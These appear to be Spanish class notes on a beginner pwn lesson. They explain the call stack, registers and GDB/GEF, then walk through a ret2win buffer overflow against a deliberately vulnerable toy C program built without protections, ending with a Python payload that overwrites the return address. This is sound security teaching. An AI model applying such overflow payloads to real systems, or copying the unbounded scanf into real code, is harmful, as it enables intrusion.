# Clase 2 - ret2win

#C #BufferOverflow #ensamblador #gdb #ret2win #pila #registros #gcc #godbolt

## Herramienta: Godbolt.org

La página godbolt.org es muy útil para escribir código de varios lenguajes, se divide a la mitad:

- En la parte izquierda: el código en sí que escribimos
- A la derecha: muestra el Ensamblador

## Introducción al Buffer Overflow y Ensamblador

Comenzaremos con un BufferOverflow y ver algo de Ensamblador. Vamos recio, tenemos este código en C:
```c
#include <stdio.h>

void func3() {
}

void func2() {
    func3();
}

void func1() {
    func2();
}

int main() {
    func1();
    puts("Ya acabe, y me vale verga");
    return 0;
}
```

El cual pasaremos a explicar con una pila (Lata de Pringles (mete/saca desde arriba)) lo que hace que es una serie de llamadas:
```
func3
func2
func1
main
```

## Compilación sin protecciones

Este comando para compilar:
```bash
gcc main.c -o main -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro
```

Hace que se desactive:

- `-fno-stack-protector` → Elimina la protección contra buffer overflows
- `-z execstack` → Hace la pila ejecutable (permite ejecutar código en el stack)
- `-no-pie` → Desactiva Position Independent Executable
- `-Wl,-z,norelro` → Desactiva RELRO (Relocation Read-Only)

## Comandos básicos de GDB

Compilar con el comando y abrir gdb:
```bash
gdb ./main
```

Comandos útiles:
```gdb
(gdb) b *main          # Breakpoint en main
(gdb) r                # Ejecutar
(gdb) s                # Entrará a funcion
(gdb) bt               # Mostrará la pila completa
(gdb) n                # Avanzará línea por línea
(gdb) ni               # Avanza 1 línea assembled ensamblador no 1 línea código
(gdb) c                # Avanzar 
(gdb) b *func1         # Breakpoint en función 1
```

Avanzamos y vemos justamente la pila como se va haciendo de llamadas con direcciones de memoria.

Resultado:
```
#0  func3 () at quetal.c:4
#1  0x000000000040113b in func2 () at quetal.c:7
#2  0x000000000040114c in func1 () at quetal.c:11
#3  0x000000000040115d in main () at quetal.c:15
```

Como una pilita vaya.

## Código en Ensamblador

Ahora si ponemos el código en la página antes mencionada vemos este pedazo de código ensamblador:
```asm
func3:
        push    rbp
        mov     rbp, rsp
        nop
        pop     rbp
        ret
func2:
        push    rbp
        mov     rbp, rsp
        call    func3
        nop
        pop     rbp
        ret
func1:
        push    rbp
        mov     rbp, rsp
        call    func2
        nop
        pop     rbp
        ret
.LC0:
        .string "Ya acabe, y me vale verga"
main:
        push    rbp
        mov     rbp, rsp
        call    func1
        mov     edi, OFFSET FLAT:.LC0
        call    puts
        mov     eax, 0
        pop     rbp
        ret
```

Si checamos estas 2 siempre están:
```asm
push    rbp
mov     rbp, rsp
```

En gdb podemos hacer `disassemble main` para ver el ensamblador entero.

## Registros importantes

Hay 3 registros importantes que veremos actualmente:

- **rip** - En qué parte del código estamos, qué instrucción estamos ejecutando (instruction pointer)
- **rbp** - (base pointer) es un pivote
- **rsp** - Apuntador al último valor que se agregó al stack stack pionter

El stack aunque sea una pila crece para abajo, es decir si vemos los elementos más recientes apuntan a direcciones de memoria cada vez más abajo o menores.

El base pointer rbp sirve para acceder a las variables locales.

Una vez llegado a la última invocación de nuestro código vamos a tener que retroceder, en ensamblador se ejecutará la instrucción `pop` la cual hace que el último valor en el stack lo guardará en rbp, como quien dice recuperar el rbp base pointer de la función anterior función2. Ahora lo que tiene que hacer es recuperar el instruction pointer de la función2, así que tenemos la función `ret` que lo que hace es como un pop a rip.

Básicamente fue una explicación de lo que pasa con los apuntadores en la ejecución de ese programa, como se mueven y recuperan.

## Ejemplo con scanf

Dejaremos de hacer tanta llamada y modificamos el código así:
```c
#include <stdio.h>

void func1() {
    char buf[30];
    scanf("%s", buf);
}

int main() {
    func1();
    puts("Ya acabe");
    return 0;
}
```

Compilamos:
```bash
gcc -g main.c -o main -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro
```

[Añadimos el `-g` para darle información de depuración sino los pasos simples no jalan (n)]

Ejecutamos:
```bash
gdb ./archivo
b *main
r
```

Nuestra salida es estándar totalmente normal, la de Elías es una salvajada.

## Instalación de GEF para GDB

Podemos instalar un plugin para ver más a detalle la salida de gdb:
```bash
# Instalación simple de GEF (Pwndbg instalar esa para análisis más a profundidad)
wget -q -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/main/scripts/gef.sh
bash ~/.gdbinit-gef.py
```

Con esto al hacer `r` se verán muchos más detalles tipo:
```
------------------STACK-------------
0x00007fffffffdce8│+0x0000: 0x00007ffff7dd9ca8  →   mov edi, eax         ← $rsp
0x00007fffffffdcf0│+0x0008: 0x00007fffffffdde0  →  0x00007fffffffdde8  →  0x0000000000000038 ("8"?)
0x00007fffffffdcf8│+0x0010: 0x000000000040115c  →  <main+0000> push rbp
0x00007fffffffdd00│+0x0018: 0x0000000100400040 ("@"?)
0x00007fffffffdd08│+0x0020: 0x00007fffffffddf8  →  0x00007fffffffe174  →  "/home/kali/Documents/pwn/eliasCodesPruebas/quetal"
0x00007fffffffdd10│+0x0028: 0x00007fffffffddf8  →  0x00007fffffffe174  →  "/home/kali/Documents/pwn/eliasCodesPruebas/quetal"
0x00007fffffffdd18│+0x0030: 0x41b222f95bc7f55d
0x00007fffffffdd20│+0x0038: 0x0000000000000000
```

## Análisis del Stack

Bueno entonces cuando hagamos `r` y llame a la función 1:
```
      8  int main() {
 →    9      func1();
     10      puts("Ya acabe");
     11      return 0;
     12  }
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "quetal", stopped 0x401160 in main (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401160 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Damos `s` para introducirnos.

Vemos cómo en el stack se asignó valor para guardar el arreglo de chars de nuestro programa en este caso 30 (todos los 0 de arriba).

Gracias a esta instrucción: `sub rsp, 0x20` que le resta eso al registro rip para dejar espacio para nuestro arreglo.
```
0x00007fffffffdcb0│+0x0000: 0x0000000000000000   ← $rsp
0x00007fffffffdcb8│+0x0008: 0x0000000000000000
0x00007fffffffdcc0│+0x0010: 0x0000000000000000
0x00007fffffffdcc8│+0x0018: 0x00007ffff7fe4780  →   push rbp
0x00007fffffffdcd0│+0x0020: 0x00007fffffffdce0  →  0x0000000000000001    ← $rbp
0x00007fffffffdcd8│+0x0028: 0x000000000040116a  →  <main+000e> lea rax, [rip+0xe96]        # 0x402007
0x00007fffffffdce0│+0x0030: 0x0000000000000001
0x00007fffffffdce8│+0x0038: 0x00007ffff7dd9ca8  →   mov edi, eax
```

## Sobrescritura del Buffer

Metemos como muestra 30 A para ver qué rollo, así queda el stack:
```
0x00007fffffffdcb0│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"     ← $rsp
0x00007fffffffdcb8│+0x0008: "AAAAAAAAAAAAAAAAAAAAAA"
0x00007fffffffdcc0│+0x0010: "AAAAAAAAAAAAAA"
0x00007fffffffdcc8│+0x0018: 0x0000414141414141 ("AAAAAA"?)
0x00007fffffffdcd0│+0x0020: 0x00007fffffffdce0  →  0x0000000000000001    ← $rbp
0x00007fffffffdcd8│+0x0028: 0x000000000040116a  →  <main+000e> lea rax, [rip+0xe96]        # 0x402007
0x00007fffffffdce0│+0x0030: 0x0000000000000001
0x00007fffffffdce8│+0x0038: 0x00007ffff7dd9ca8  →   mov edi, eax
```

Checando el registro de memoria de main a donde regresaremos:
```
0x00007fffffffdcd8│+0x0028: 0x000000000040116a  →  <main+000e> lea rax, [rip+0xe96]        # 0x402007
```

`dcd8` es el que apunta a main pero qué pasa si metemos más A, por ejemplo 60:
```
0x00007fffffffdcb0│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $rsp
0x00007fffffffdcb8│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffdcc0│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0x00007fffffffdcc8│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0x00007fffffffdcd0│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAA"       ← $rbp
0x00007fffffffdcd8│+0x0028: "AAAAAAAAAAAAAAAAAAAA"
0x00007fffffffdce0│+0x0030: "AAAAAAAAAAAA"
0x00007fffffffdce8│+0x0038: 0x00007f0041414141 ("AAAA"?)
```

Vemos que lo que correspondía a la dirección de main está alterado, se llenó de puras A:
```
0x00007fffffffdcd8│+0x0028: "AAAAAAAAAAAAAAAAAAAA"
```

La forma de impedir la reescritura es restringir lo permitido en el código:
```c
scanf("%29s", buf); // Restringe a 29 caracteres (por el null byte)
```

## Implementación de ret2win

Bueno ahora probemos otra cosa, pero antes modificamos el código añadiendo una función:
```c
#include <stdio.h>

void win() {
    puts("ganaste mi rey, toma un grr");
}

void func1() {
    char buf[30];
    scanf("%s", buf);
}

int main() {
    func1();
    puts("Ya acabe");
    return 0;
}
```

Compilamos de manera efectiva desactivando mecanismos de seguridad ya sabes:
```bash
gcc -g main.c -o main -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro
```

Entonces ahora el ret2win es el caso más simple de buffer overflow.

Consiste en lograr que al salir de la función en vez de regresar a main que regrese a win por ejemplo. Entonces recuperamos la dirección de memoria de win en gdb, todo claro.
```gdb
disassemble win
```
```
gef➤  disassemble win
Dump of assembler code for function win:
   0x0000000000401136 <+0>:     push   rbp
   0x0000000000401137 <+1>:     mov    rbp,rsp
   0x000000000040113a <+4>:     lea    rax,[rip+0xec3]        # 0x402004
   0x0000000000401141 <+11>:    mov    rdi,rax
   0x0000000000401144 <+14>:    call   0x401030 <puts@plt>
   0x0000000000401149 <+19>:    nop
   0x000000000040114a <+20>:    pop    rbp
   0x000000000040114b <+21>:    ret
End of assembler dump.
gef➤  
```

Dirección: `0x0000000000401136 <+0>: push rbp` → `0000000000401136`

Debemos poner eso en la dirección de main al aprovechar la reescritura del buffer.

Primero vemos esto:
```
gef➤  disassemble func1
Dump of assembler code for function func1:
   0x000000000040114c <+0>:     push   rbp
   0x000000000040114d <+1>:     mov    rbp,rsp
   0x0000000000401150 <+4>:     sub    rsp,0x20
   0x0000000000401154 <+8>:     lea    rax,[rbp-0x20]
   0x0000000000401158 <+12>:    mov    rsi,rax
   0x000000000040115b <+15>:    lea    rax,[rip+0xebe]        # 0x402020
   0x0000000000401162 <+22>:    mov    rdi,rax
   0x0000000000401165 <+25>:    mov    eax,0x0
   0x000000000040116a <+30>:    call   0x401040 <__isoc99_scanf@plt>
=> 0x000000000040116f <+35>:    nop
   0x0000000000401170 <+36>:    leave
   0x0000000000401171 <+37>:    ret
End of assembler dump.
gef➤  
```

Recordamos lo que dijimos arriba: `sub rsp,0x20`

Ese `0x20` es lo que se resta para dejar el espacio para el arreglo. Entonces `0x20` son lo que debemos rellenar para comenzar a escribir.

`0x20` son 32 caracteres, podemos hacer esto en Python:
```bash
python2 -c "print b'A'*0x20"
```

Con eso llenamos el primer bloque de 0 parejo, nos falta el de abajo que son 8 bytes así que:
```bash
python2 -c "print b'A'*0x20 + b'A'*8"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

## Explotación final

Entonces ahora hay que meterle la dirección de win PERO al revés por algo que dicen que el little endian o sabe qué:
```
0000000000401136 --> \x36\x11\x40\x00\x00\x00\x00\x00
```
```bash
python2 -c "print b'A'*0x20 + b'A'*8 + b'\x36\x11\x40\x00\x00\x00\x00\x00'"
```

Simplemente se lo pasamos al programa:
```bash
python2 -c "print b'A'*0x20 + b'A'*8 + b'\x36\x11\x40\x00\x00\x00\x00\x00'" | ./main
ganaste mi rey, toma un grr <-- YEA
zsh: done                python2 -c "print b'A'*0x20 + b'A'*8 + b'\x36\x11\x40\x00\x00\x00\x00\x00'" | 
zsh: segmentation fault  ./main
```